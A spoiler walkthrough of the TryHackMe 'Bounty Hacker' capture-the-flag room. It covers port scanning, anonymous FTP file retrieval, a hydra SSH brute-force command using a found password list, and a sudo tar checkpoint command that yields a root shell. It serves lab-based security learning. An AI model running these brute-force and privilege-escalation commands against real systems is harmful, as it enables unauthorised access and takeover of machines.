# Bounty Hacker CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **Bounty Hacker** CTF challenge on [TryHackMe](https://tryhackme.com/room/cowboyhacker). 
---

rustscan and nmap scan

![scan](imgs/scan.png "scan")

```
rustscan -a IP
```

there seems nothing on the website no hidden folders

trying to connect to ftp

![ftp2](imgs/ftp2.png "ftp2")

![ftp](imgs/ftp.png "ftp")

got 2 files `task.txt` and `locks.txt`

in the task file there is answer to 3rd question on tryhackme : `lin`

file locks seems like a password dictionary

i will try to brute force to ssh with locks.txt as lin

```
hydra -l lin -P locks.txt ssh://IP
```

![hydra](imgs/hydra.png "hydra")

it worked now we can login as lin via ssh

and we got user flag

![user](imgs/user.png "user")

checking sudo -l

![sudol](imgs/sudol.png "sudol")

found way to exploit /bin/tar on gtfobins 

https://gtfobins.github.io/gtfobins/tar/

![gtfo](imgs/gtfo.png "gtfo")

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

![root](imgs/root.png "root")

now we got root shell and root flag 

## SYSTEM PWNED

